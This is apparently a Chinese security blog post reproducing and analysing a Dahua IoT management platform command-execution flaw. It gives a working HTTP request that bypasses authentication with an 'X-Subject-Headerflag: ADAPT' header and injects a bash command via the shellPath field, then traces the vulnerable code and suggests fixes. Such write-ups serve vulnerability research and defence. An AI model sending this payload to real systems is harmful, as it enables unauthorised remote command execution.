> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkyNTYxNDAwNQ==&mid=2247484960&idx=1&sn=ad43cab8df06b479660c3c71137eb642

#  【漏洞复现】大华智能物联网综合管理平台 receive 命令执行漏洞  
原创 PokerSec  PokerSec   2025-07-22 01:01  
  
> 目前该漏洞互联网上资产基本都已修复，官方应该是做了热补丁，本文只做记录分析学习。  
  
  
****  
**先关注，不迷路.**  
## 免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 漏洞介绍  
  
大华智能物联综合管理平台，作为浙江大华技术股份有限公司推出的一款集成了多项业务管理功能的平台软件，该平台主要面向智能园区、商业综合体等多种应用场景，旨在提供一个全面、高效的解决方案，为客户提供一套集成、高效、开放、灵活可扩展、可定制的平台软件产品。功能全面、灵活可扩展、安全可靠的智能物联基础软件平台，能够满足企业在不同场景下的各种业务需求，助力企业实现数智化转型升级。大华智能物联综合管理平台receive和push接口存在命令执行漏洞，攻击者可利用该漏洞获取系统权限。  
## 漏洞复现  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJJ7YXXKosbOTFUro8gz7eicpDzIUQictcTUullPOcNfKv7fe4MI3VCytmWyI29ziaMUIdawtWaZOug9w/640?wx_fmt=png&from=appmsg "")  
  
POC:  
  
(这微信页面直接复制代码格式会乱，可以浏览器打开复制)  

```
POST /evo-runs/v1.0/receive
POST /evo-runs/v1.0/push
```


```
POST /evo-runs/v1.0/receive HTTP/1.1
Host: xxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Connection: close
Content-Length: 258
Content-Type: application/json
X-Subject-Headerflag: ADAPT
Accept-Encoding: gzip, deflate

{
 &#34;method&#34;: &#34;agent.ossm.mapping.config&#34;,
 &#34;info&#34;: {
  &#34;configure&#34;: &#34;abcd&#34;,
  &#34;filePath&#34;: &#34;haha&#34;,
  &#34;paramMap&#34;: {
   &#34;shellPath&#34;: &#34;/bin/bash -c id>/opt/evoWpms/static/xxx.txt&#34;,
   &#34;filePath&#34;: &#34;abc&#34;
  },
  &#34;requestIp&#34;: &#34;&#34;
}
```

  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJJ7YXXKosbOTFUro8gz7eicpzu0YQZZiajTAvlzLPxjYjibbA3SEyKGPF3bacIkM8BZp39tvBpOGwPhQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJJ7YXXKosbOTFUro8gz7eicptcULh9iclUKm26iar4fNlnWyeJcJSwWIWIbibY5Xnxz9SyhFeb1s6ibgIw/640?wx_fmt=png&from=appmsg "")  
## 漏洞分析  
  
com/dahua/evo/runs/filter/AuthFilter.java中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJJ7YXXKosbOTFUro8gz7eicpZU1MzX5YMN4j0R7qkuQ744303nmA30FpWW9gxSSumm4QyyeHK80KVw/640?wx_fmt=png&from=appmsg "")  
  
直接查看doFilter 方法，根据代码备注，可以发现如果header中包含X-Subject-HeaderFlag 为ADAPT 则不鉴权（刚开始还以为是adapt poc标记呢），如果方法在set中，则不进行鉴权  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJJ7YXXKosbOTFUro8gz7eicpGLjyBZEAk3tFnnicrpGqRAllXzpscibV49RXFlQDZ4hPR7XHMh1ebQcQ/640?wx_fmt=png&from=appmsg "")  
  
看看放行方法怎么设置的，是从配置文件读取的，根据鉴权，如果在这里面的方法是可以直接调的，不在的就需要鉴权，但又可以header中包含X-Subject-HeaderFlag : ADAPT 进行绕过  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJJ7YXXKosbOTFUro8gz7eicpXwhjCgWHia0msX2yARbx8e2c4O3rtwiaibibolf092vKBzcnM7peBvyHCA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJJ7YXXKosbOTFUro8gz7eicpq8wWr2WFI8WQ17Xhl1T4jlFDSOUlcHAAjLo3icyOsZhE22qn4rvcvYw/640?wx_fmt=png&from=appmsg "")  
  
跟进路由  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJJ7YXXKosbOTFUro8gz7eicpoojTwaUQaVoJ1RribCchLbWFn1lp5icibj45vWIpyiaCSewpbTqdUW2FSg/640?wx_fmt=png&from=appmsg "")  
  
解析请求体（
```
@RequestBody
```

  
）为 
```
AgentMsgParam
```

  
 对象  
  
调用业务服务 
```
msgDealService.msgDeal()
```

  
 处理消息  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJJ7YXXKosbOTFUro8gz7eicplZtsG7Sa6K3pbibV07ibzO9aGJ0QicQRAKMHgfE0XYpwTL8OThRWr2qcw/640?wx_fmt=png&from=appmsg "")  
  
设置为本次漏洞可利用的方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJJ7YXXKosbOTFUro8gz7eicpCQj2mlsHXib4z61kuVGRe2GbttdaiaZ4oFpFNviaiaBic8HACcmICMO0ydg/640?wx_fmt=png&from=appmsg "")  
  
跟进去就是runtime 执行系统命令  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJJ7YXXKosbOTFUro8gz7eicp8MDp8muhDib0hljnrHDVlA1bPYVzfnJotHYNibFB0GLfibR5JicIv7ic4Fw/640?wx_fmt=png&from=appmsg "")  
## 修复意见  
  
1.关闭互联网暴露面或接口设置访问权限  
  
2.联系官方获取补丁信息：https://www.dahuatech.com/  
  
  
  
如有侵权，请及时联系删除。  
  
